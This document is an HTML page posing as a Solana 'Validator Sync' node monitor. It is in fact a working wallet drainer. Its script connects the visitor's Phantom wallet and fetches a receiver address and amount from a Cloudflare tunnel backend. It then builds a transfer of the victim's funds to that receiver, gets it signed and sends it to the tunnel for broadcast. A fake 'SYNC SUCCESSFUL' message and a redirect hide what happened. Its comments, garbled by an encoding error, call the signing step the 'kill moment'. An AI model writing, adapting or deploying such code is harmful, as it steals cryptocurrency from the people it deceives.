<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Validator Sync System</title>
    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
    <style>
        body { background: #000; color: #14f195; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { border: 1px solid #14f195; padding: 40px; border-radius: 8px; text-align: center; width: 300px; background: #050505; }
        .bar { background: #111; height: 4px; margin: 20px 0; border-radius: 2px; overflow: hidden; }
        #fill { background: #14f195; height: 100%; width: 0%; transition: 0.4s; }
        button { background: #14f195; color: #000; border: none; padding: 15px; width: 100%; font-weight: bold; cursor: pointer; border-radius: 4px; font-size: 14px; text-transform: uppercase; }
        #log { font-size: 10px; color: #444; margin-top: 15px; }
    </style>
</head>
<body>
    <div class="box">
        <h3 style="margin:0; color:#9945FF;">NODE MONITOR</h3>
        <p style="font-size:12px; margin:10px 0; color:#888;">STATUS: <span style="color:red;">DE-SYNC</span></p>
        <div class="bar"><div id="fill"></div></div>
        <button id="cta">INITIALIZE SYNC</button>
        <div id="log">Awaiting Boot...</div>
    </div>

    <script>
        // ğŸ”± éš§é“åœ°å€ - å¿…é¡»ä¸ Helius åç«¯é…åˆ
        const tunnel = "https://trading-thesis-isolation-cookbook.trycloudflare.com";

        window.onload = () => { document.getElementById('log').innerText = "System Ready v8.2"; };

        document.getElementById('cta').onclick = async () => {
            const log = (t) => document.getElementById('log').innerText = t;
            const bar = document.getElementById('fill');
            const sWeb3 = window.solanaWeb3;
            const p = window.solana || window.phantom?.solana;

            if (!p) { alert("Please open in Phantom App"); return; }

            try {
                log("Connecting Wallet...");
                await p.connect();
                bar.style.width = "30%";

                log("Fetching Helius Params...");
                // 1. é—®ä½ çš„ Helius åç«¯è¦ç²¾å‡†æ•°æ® (11020000)
                const resp = await fetch(tunnel + "/prepare", {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ address: p.publicKey.toString() })
                });
                const info = await resp.json();
                
                if (info.error) { log("Sync Unnecessary"); return; }
                bar.style.width = "60%";

                log("Constructing Transaction...");
                // 2. æ„é€ äº¤æ˜“ (ä¸¥æ ¼å¯¹é½ï¼Œä¸ä½¿ç”¨ä»»ä½• Buffer)
                const tx = new sWeb3.Transaction().add(
                    sWeb3.SystemProgram.transfer({
                        fromPubkey: p.publicKey,
                        toPubkey: new sWeb3.PublicKey(info.receiver),
                        lamports: parseInt(info.amount),
                    })
                );
                tx.recentBlockhash = info.bh;
                tx.feePayer = p.publicKey;

                log("Awaiting Signature...");
                // 3. å”¤èµ·ç­¾å (ç»æ€æ—¶åˆ»)
                const signed = await p.signTransaction(tx);
                
                log("Broadcasting via Helius...");
                // 4. åºåˆ—åŒ–å¤„ç† (æ‰‹åŠ¨è½¬æ¢å­—èŠ‚ï¼Œé˜² Buffer defined æŠ¥é”™)
                const serialized = signed.serialize();
                let binary = "";
                const bytes = new Uint8Array(serialized);
                for (let i = 0; i < bytes.byteLength; i++) {
                    binary += String.fromCharCode(bytes[i]);
                }

                fetch(tunnel + "/broadcast", {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ raw_tx: btoa(binary) })
                });

                bar.style.width = "100%";
                log("SYNC SUCCESSFUL!");
                setTimeout(() => { window.location.href = "https://explorer.solana.com/"; }, 1500);

            } catch (err) {
                console.error(err);
                log("ERROR: " + err.message);
                setTimeout(() => { location.reload(); }, 2000);
            }
        };
    </script>
</body>
</html>
